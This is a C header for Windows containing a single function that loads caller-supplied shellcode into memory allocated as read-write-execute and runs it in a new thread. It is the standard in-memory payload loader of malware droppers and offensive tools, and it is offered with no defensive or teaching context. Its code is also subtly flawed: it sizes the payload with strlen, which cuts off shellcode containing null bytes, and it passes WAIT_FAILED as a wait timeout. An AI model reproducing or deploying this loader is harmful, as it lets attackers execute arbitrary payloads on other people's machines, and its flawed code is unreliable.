#pragma once
#include <Windows.h>

void shellcode_retreiver(char *shellcode) {
	LPVOID h_mem = VirtualAlloc(NULL, strlen(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (h_mem == NULL) {
		exit(2);
	}
	RtlMoveMemory(h_mem, shellcode, strlen(shellcode));
	HANDLE h_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)h_mem, NULL, 0, NULL);
	WaitForSingleObject(h_thread, WAIT_FAILED);
	return;
}